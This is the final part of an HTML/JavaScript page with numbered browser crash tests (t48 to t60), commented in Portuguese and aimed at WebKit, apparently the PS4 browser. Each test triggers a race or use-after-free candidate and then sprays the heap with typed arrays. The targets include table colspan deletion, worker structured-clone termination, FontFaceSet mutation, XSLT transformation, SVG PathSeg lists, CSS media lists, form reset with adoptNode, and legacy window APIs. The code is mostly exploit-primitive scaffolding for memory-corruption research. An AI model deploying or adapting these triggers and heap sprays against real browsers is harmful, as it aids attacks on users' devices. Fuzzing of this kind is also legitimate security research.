                    document.getElementById('gpu_target').style.display = 'none';
                    
                    clearInterval(loop);
                    log.innerText = "Filter attributes removed during GPU calc";
                    spray.push(new Float32Array(5000));
                }
            } catch(e) {}
        }, 16); // ~60fps
    }

    // =================================================================
    // 48. Table Colspan Layout Bomb
    // Evento: onresize (Layout Thrashing)
    // API: deleteCell + colSpan
    // Lógica: O WebKit usa uma estrutura complexa para gerenciar células mescladas (colspan).
    // Criamos uma tabela, mesclamos células dinamicamente e deletamos uma célula
    // que afeta o cálculo da largura das colunas vizinhas.
    // =================================================================
    function t48() {
        const table = document.createElement('table');
        table.border = "1";
        const row = table.insertRow();
        
        // Cria muitas células
        for(let i=0; i<20; i++) row.insertCell().innerText = i;
        stage.appendChild(table);

        // Gatilho de layout
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        ifr.contentWindow.onresize = () => {
            try {
                // AÇÃO DESTRUTIVA
                // Define um colspan gigante na primeira célula
                row.cells[0].colSpan = 10;
                
                // Deleta uma célula que agora deveria estar "coberta" ou deslocada
                // Isso confunde o array interno de larguras de coluna
                row.deleteCell(5);
                
                // Força leitura de geometria
                const w = table.offsetWidth;
                
                log.innerText = "Cell deleted during colspan recalc";
                spray.push(new Array(1000).fill(1.1));
            } catch(e) {}
        };

        // Trigger
        let w = 100;
        setInterval(() => { ifr.style.width = (w++ % 200) + "px"; }, 10);
    }

    // =================================================================
    // 49. Worker Structured Clone Bomb
    // Evento: onmessage
    // API: postMessage (Deep Clone) + terminate
    // Lógica: Enviar um objeto complexo para um Worker aciona o algoritmo de "Structured Clone".
    // Isso aloca memória recursivamente. Matar o worker no meio desse processo
    // pode corromper o heap se a clonagem não for atômica.
    // =================================================================
    function t49() {
        // Cria um objeto profundamente aninhado
        let bomb = { a: 1 };
        for(let i=0; i<500; i++) {
            bomb = { next: bomb, data: new Uint8Array(1024) };
        }

        const blob = new Blob([`onmessage = function(e) { postMessage("ACK"); }`], {type: 'text/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));

        // Envia a bomba
        try {
            worker.postMessage(bomb);
            
            // AÇÃO DESTRUTIVA
            // Mata o worker imediatamente. O WebKit ainda está percorrendo o objeto 'bomb'
            // para copiá-lo para a memória do worker.
            worker.terminate();
            
            log.innerText = "Worker terminated during deep clone";
            spray.push(new Uint32Array(1024*100));
        } catch(e) {}
    }

    // =================================================================
    // 50. Font Iterator Invalidation
    // Evento: requestAnimationFrame (Render Loop)
    // API: document.fonts.add / delete
    // Lógica: O navegador itera sobre o 'FontFaceSet' para decidir quais fontes carregar/desenhar.
    // Modificar esse Set (adicionar/remover) DENTRO do loop de renderização invalida o iterador C++.
    // =================================================================
    function t50() {
        const font = new FontFace('CrashFont', 'url(data:font/woff;base64,AAA)');
        
        function loop() {
            try {
                // Adiciona
                document.fonts.add(font);
                
                // Força estilo que usa a fonte
                stage.style.fontFamily = "CrashFont";
                
                // AÇÃO DESTRUTIVA
                // Remove imediatamente antes do paint
                document.fonts.delete(font);
                
                // Força layout
                const h = stage.scrollHeight;
                
                log.innerText = "FontSet modified during render frame";
                spray.push(new Float64Array(100));
                
                requestAnimationFrame(loop);
            } catch(e) {}
        }
        loop();
    }
// =================================================================
    // 51. XSLT Processor UAF
    // API: XSLTProcessor.transformToFragment
    // Lógica: XSLT é uma linguagem para transformar XML. O processador roda em C++.
    // Se alterarmos o XML de origem enquanto o processador o está lendo,
    // podemos causar um acesso inválido à memória na engine libxslt/WebCore.
    // =================================================================
    function t51() {
        const xmlString = '<root>' + '<item>Data</item>'.repeat(100) + '</root>';
        const xslString = `
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                <xsl:template match="/">
                    <xsl:for-each select="root/item">
                        <div><xsl:value-of select="."/></div>
                    </xsl:for-each>
                </xsl:template>
            </xsl:stylesheet>
        `;

        const parser = new DOMParser();
        const xmlDoc = parser.parseFromString(xmlString, "text/xml");
        const xslDoc = parser.parseFromString(xslString, "text/xml");

        const xsltProcessor = new XSLTProcessor();
        xsltProcessor.importStylesheet(xslDoc);

        // AÇÃO DESTRUTIVA
        // Inicia a transformação
        try {
            // Agenda a destruição do nó raiz do XML para o próximo tick (ou microtask)
            // Tenta acertar o momento que o XSLT está iterando sobre <item>
            setTimeout(() => {
                const root = xmlDoc.getElementsByTagName('root')[0];
                while (root.firstChild) root.removeChild(root.firstChild);
            }, 0);

            const result = xsltProcessor.transformToFragment(xmlDoc, document);
            stage.appendChild(result);
            
            log.innerText = "XML modified during XSLT transformation";
            spray.push(new Uint32Array(5000));
        } catch(e) {}
    }

    // =================================================================
    // 52. Audio Panner DSP Crash
    // Alvo: libSceAudioOut (Hardware 3D Audio)
    // API: PannerNode + disconnect
    // Lógica: O PannerNode usa matemática complexa (HRTF) para simular som 3D.
    // Alterar a posição rapidamente e desconectar o nó força o DSP a recalcular
    // o grafo de áudio. Se feito rápido o suficiente, o driver pode desincronizar.
    // =================================================================
    function t52() {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const panner = ctx.createPanner();
        
        // Configurações HRTF pesadas
        panner.panningModel = 'HRTF';
        panner.distanceModel = 'inverse';
        
        osc.connect(panner);
        panner.connect(ctx.destination);
        osc.start(0);

        let i = 0;
        const loop = setInterval(() => {
            try {
                // Move o som rapidamente no espaço 3D
                panner.setPosition(Math.sin(i), Math.cos(i), Math.tan(i));
                i += 0.1;

                // AÇÃO DESTRUTIVA
                // A cada 10 ciclos, desconecta e reconecta violentamente
                if (Math.random() > 0.8) {
                    panner.disconnect();
                    // Reconecta imediatamente para estressar o lock do grafo
                    panner.connect(ctx.destination);
                }
                
                if(i > 20) {
                    clearInterval(loop);
                    ctx.close();
                    log.innerText = "PannerNode stressed";
                }
            } catch(e) {}
        }, 10);
        
        spray.push(new Float32Array(1024));
    }

    // =================================================================
    // 53. Selection Modify Crash
    // API: window.getSelection().modify + deleteFromDocument
    // Lógica: 'modify' expande a seleção de texto semanticamente (por palavra/linha).
    // É uma lógica complexa de travessia de DOM. Executamos isso em um conteúdo
    // que está sendo deletado simultaneamente.
    // =================================================================
    function t53() {
        const d = document.createElement('div');
        d.contentEditable = true;
        d.innerText = "SELEÇÃO CAÓTICA ".repeat(50);
        stage.appendChild(d);
        d.focus();

        const sel = window.getSelection();
        sel.collapse(d, 0);

        const loop = setInterval(() => {
            try {
                // Expande a seleção palavra por palavra
                sel.modify("extend", "forward", "word");
                
                // AÇÃO DESTRUTIVA
                // Quando a seleção fica grande, deletamos o conteúdo selecionado
                // e tentamos expandir a seleção a partir de um ponto que não existe mais
                if (sel.toString().length > 20) {
                    // API da sua lista
                    sel.deleteFromDocument(); 
                    
                    // Tenta modificar a seleção imediatamente após delete
                    sel.modify("extend", "forward", "character");
                }
                
                if (d.innerText.length === 0) {
                    clearInterval(loop);
                    log.innerText = "Selection modified on deleted content";
                }
            } catch(e) {}
        }, 10);
    }

    // =================================================================
    // 54. SVG PathSeg Segfault
    // API: createSVGPathSegClosePath
    // Lógica: PathSeg é uma interface antiga (removida do Chrome, mas presente no PS4).
    // Ela expõe os segmentos de um path SVG como objetos vivos.
    // Tentamos acessar e modificar essa lista enquanto limpamos o path.
    // =================================================================
    function t54() {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
        path.setAttribute("d", "M0 0 L100 100 L200 0");
        svg.appendChild(path);
        stage.appendChild(svg);

        try {
            // Verifica se a API legada existe
            if (!path.pathSegList) {
                log.innerText = "API PathSeg não suportada (Browser muito novo?)";
                return;
            }

            // Loop de manipulação
            for(let i=0; i<100; i++) {
                // API da sua lista
                const seg = path.createSVGPathSegClosePath();
                path.pathSegList.appendItem(seg);
            }

            // AÇÃO DESTRUTIVA
            // Limpa a lista usando a API de lista, não setAttribute
            path.pathSegList.clear();
            
            // Tenta inserir num índice inválido após limpar
            path.pathSegList.insertItemBefore(path.createSVGPathSegClosePath(), 0);
            
            log.innerText = "PathSegList manipulated after clear";
            spray.push(new Uint32Array(pattern));
        } catch(e) {
            log.innerText = "Erro/Crash: " + e.message;
        }
    }

    // =================================================================
    // 55. CSS Media Rule Corruption
    // API: MediaList.deleteMedium
    // Lógica: Manipulamos as regras de @media de uma folha de estilo via JS.
    // Deletamos o tipo de mídia (ex: "screen") enquanto um listener de `matchMedia`
    // está ativo e avaliando essa mesma regra.
    // =================================================================
    function t55() {
        const style = document.createElement('style');
        style.media = "screen and (min-width: 100px)";
        document.head.appendChild(style);
        
        const sheet = style.sheet;
        
        // Listener que monitora a regra
        const mql = window.matchMedia("(min-width: 100px)");
        mql.addListener(() => {
            log.innerText = "Media Query Changed";
        });

        setTimeout(() => {
            try {
                // AÇÃO DESTRUTIVA
                // API da sua lista
                // Remove o identificador "screen", invalidando a regra de mídia
                // enquanto o motor CSSOM a gerencia.
                sheet.media.deleteMedium("screen");
                
                // Força atualização
                style.media = "print";
                
                log.innerText = "Media rule deleted from live sheet";
                spray.push(new ArrayBuffer(1024*100));
            } catch(e) {
                log.innerText = e.message;
            }
        }, 100);
    }
// =================================================================
    // 56. SVG Force Redraw Race
    // API: forceRedraw + suspendRedraw 
    // Lógica: O WebKit antigo permite controlar manualmente o pipeline de renderização SVG.
    // Forçar um redesenho (`forceRedraw`) enquanto o desenho está suspenso (`suspendRedraw`)
    // cria um conflito de estado no renderizador gráfico.
    // =================================================================
    function t56() {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        svg.setAttribute("width", "100%"); svg.setAttribute("height", "100%");
        // Cria geometria complexa
        const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
        path.setAttribute("d", "M0 0 " + "L 10 10 ".repeat(500));
        path.setAttribute("stroke", "red");
        svg.appendChild(path);
        stage.appendChild(svg);

        // Loop de conflito
        const interval = setInterval(() => {
            try {
                // 1. Suspende o desenho (retorna um handle de suspensão)
                const handle = svg.suspendRedraw(100);
                
                // 2. AÇÃO DESTRUTIVA: Força redesenho IMEDIATO ignorando a suspensão
                // Isso pode causar corrupção se o buffer estiver bloqueado
                svg.forceRedraw();
                
                // 3. Libera a suspensão (às vezes fora de ordem)
                if(Math.random() > 0.5) svg.unsuspendRedraw(handle);
                
                // Modifica geometria para invalidar cache
                path.setAttribute("transform", `rotate(${Math.random()*360})`);
            } catch(e) {
                // Algumas versões removem essas APIs, se der erro, paramos
                log.innerText = "API não suportada ou Crash evitado";
                clearInterval(interval);
            }
        }, 10);
        
        log.innerText = "Fighting SVG Redraw Engine";
        spray.push(new Uint32Array(1000));
    }

    // =================================================================
    // 57. Form Reset Node Adoption
    // Evento: onreset 
    // API: adoptNode 
    // Lógica: Quando um formulário é resetado, o navegador itera sobre todos os seus campos
    // para restaurar valores. Se movermos (`adoptNode`) um campo para outro documento
    // *durante* essa iteração, o iterador interno do C++ pode acessar memória inválida.
    // =================================================================
    function t57() {
        const form = document.createElement('form');
        // Cria vários inputs
        for(let i=0; i<50; i++) {
            const inp = document.createElement('input');
            inp.value = "val" + i;
            form.appendChild(inp);
        }
        stage.appendChild(form);

        // Iframe para ser o destino da adoção
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        form.onreset = () => {
            try {
                log.innerText = "Resetting form...";
                // Pega um nó do meio da lista
                const target = form.elements[25];
                
                // AÇÃO DESTRUTIVA
                // Rouba o nó para o documento do iframe
                // O form ainda está iterando sobre 'elements'
                ifr.contentDocument.adoptNode(target);
                ifr.contentDocument.body.appendChild(target);
                
                log.innerText = "Node stolen during reset iteration";
                spray.push(new Float64Array(2000));
            } catch(e) {}
        };

        // Trigger: Dispara reset
        setTimeout(() => form.reset(), 500);
    }

    // =================================================================
    // 58. CSS Delete Medium Crash
    // Evento: matchMedia loop
    // API: deleteMedium [cite: 5]
    // Lógica: Regras @media têm uma lista de tipos (ex: "screen", "print").
    // O PS4 monitora mudanças de mídia. Deletar um tipo de mídia da lista
    // invalida a regra CSS, o que pode crashar o avaliador de estilo ativo.
    // =================================================================
    function t58() {
        const style = document.createElement('style');
        style.media = "screen, print, handheld";
        style.textContent = "body { background: red; }";
        document.head.appendChild(style);
        
        const mediaList = style.sheet.media;

        // Listener ativo
        const mql = window.matchMedia("screen");
        mql.addListener(() => {}); // Mantém o sistema de eventos ativo

        setTimeout(() => {
            try {
                // AÇÃO DESTRUTIVA
                // Remove o meio 'screen' que está sendo aplicado atualmente
                // API da sua lista [cite: 5]
                mediaList.deleteMedium("screen");
                
                // Força recálculo de estilo imediato
                getComputedStyle(document.body).backgroundColor;
                
                log.innerText = "Active medium deleted from stylesheet";
                spray.push(new Uint8Array(1024*1024));
            } catch(e) {
                log.innerText = e.message;
            }
        }, 200);
    }

    // =================================================================
    // 59. PathSeg Memory Flood
    // API: createSVGPathSegClosePath 
    // Lógica: Esta é uma API depreciada que expõe segmentos de path como objetos JS.
    // Criar milhares desses objetos cria pressão no heap específico de SVG.
    // Combinado com a limpeza da lista, testamos a estabilidade do gerenciador de memória SVG.
    // =================================================================
    function t59() {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
        path.setAttribute("d", "M0 0");
        svg.appendChild(path);
        stage.appendChild(svg);

        if (!path.createSVGPathSegClosePath) {
            log.innerText = "API PathSeg não disponível nesta versão";
            return;
        }

        const loop = setInterval(() => {
            try {
                // Alocação massiva de objetos de segmento
                for(let i=0; i<1000; i++) {
                    const seg = path.createSVGPathSegClosePath(); // 
                    // Não anexa ao DOM, apenas cria (Leak potencial ou GC stress)
                }
                
                // Anexa alguns para forçar processamento
                path.pathSegList.appendItem(path.createSVGPathSegClosePath());
                
                // Limpa tudo violentamente
                path.pathSegList.clear();
                
                log.innerText = "Flooding SVG Path Segments";
            } catch(e) { clearInterval(loop); }
        }, 10);
        
        spray.push(new ArrayBuffer(1024*500));
    }

    // =================================================================
    // 60. Legacy Event Release
    // API: releaseEvents  + window.close
    // Lógica: 'releaseEvents' é uma relíquia do Netscape 4 que existe no objeto Window.
    // Ela instrui o navegador a parar de capturar eventos específicos.
    // Chamar isso em uma janela que está sendo fechada é um vetor de confusão de estado.
    // =================================================================
    function t60() {
        const win = window.open("", "_blank", "width=200,height=200");
        
        if(!win) {
            log.innerText = "Pop-up bloqueado. Permita pop-ups.";
            return;
        }

        setTimeout(() => {
            try {
                // AÇÃO DESTRUTIVA
                // Tenta liberar eventos (mesmo que a API não faça nada em browsers modernos,
                // a função ainda existe no WebKit antigo e executa código C++)
                if (win.releaseEvents) {
                    // Tenta liberar eventos de mouse e teclado (máscaras legadas)
                    win.releaseEvents(Event.MOUSEDOWN | Event.KEYPRESS); 
                }
                
                // Fecha a janela imediatamente após a chamada
                win.close();
                
                log.innerText = "Released events on closing window";
                spray.push(new Uint32Array(5000));
            } catch(e) {
                log.innerText = "Erro: " + e.message;
                if(win) win.close();
            }
        }, 500);
    }

</script>
</body>
</html>